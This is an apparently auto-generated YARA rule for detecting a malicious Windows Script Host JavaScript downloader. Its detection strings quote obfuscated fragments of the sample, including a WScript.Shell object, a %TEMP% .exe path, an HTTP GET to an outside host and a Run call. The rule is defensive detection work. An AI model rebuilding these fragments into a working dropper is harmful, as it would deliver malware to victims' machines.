rule sig_20160328_e63495a0e344451d3749464dc6465458 {
  meta:
    description = "datamaliciousorder - file 20160328_e63495a0e344451d3749464dc6465458.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "8f92a94b1178e90600c5338e0b4cbb38942b0f9492621afbe9a14da70f342aba"

  strings:
    $s1  = "function Tivkgzzweg() {return Iwhubf[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"iu8kBkIKjOUi.exe\";};" fullword ascii
    $s2  = "Haigblz[Bmvspmisv](\"GET\", \"http://zapableapp.com/l1sape\", false);" fullword ascii
    $s3  = "do {WScript[Bptohz](Tjtyrpupgy() * 11)} while (Haigblz[\"readystate\"] < 4 );" fullword ascii
    $s4  = "function Xabmkct(Xatgk, Xcunusb){return Xatgk - Xcunusb;};" fullword ascii
    $s5  = "var Iwhubf = function Kkdfip() {return WScript[Yvbtsxi](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Cssrciepne(Oqtwlknwl){Iwhubf[\"Run\"](Oqtwlknwl, Xffledrdsk, Xffledrdsk);};" fullword ascii
    $s7  = "function Hgkgqvbqb() {return ((Crekmla == true) && (Crekmla == Wmasc)) ? 1 : Xffledrdsk;};" fullword ascii
    $s8  = "var Wmasc = false;" fullword ascii
    $s9  = "var Wrfrgn = false;" fullword ascii
    $s10 = "function Kcniihdqsn(Aqxnv) {var Hjjqbwyb = (1, 2, 3, 4, 5, Aqxnv); return Hjjqbwyb;};" fullword ascii
    $s11 = "function Ewdpihmw(){return Yvbtsxi;};" fullword ascii
    $s12 = "function Vfuedyvn()" fullword ascii
    $s13 = "var Crekmla = false;" fullword ascii
    $s14 = "function Zyqsowv(){return Eiqho;};" fullword ascii
    $s15 = "Wmasc = true; " fullword ascii
    $s16 = "Crekmla = true; " fullword ascii
    $s17 = "return Xabmkct(Roauwbfk, Dgtfsohqdq);" fullword ascii
    $s18 = " while (Cjazednio){" fullword ascii
    $s19 = "var Cnqnydcy = new this[\"Date\"]();" fullword ascii
    $s20 = "function Tjtyrpupgy(){return 22;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}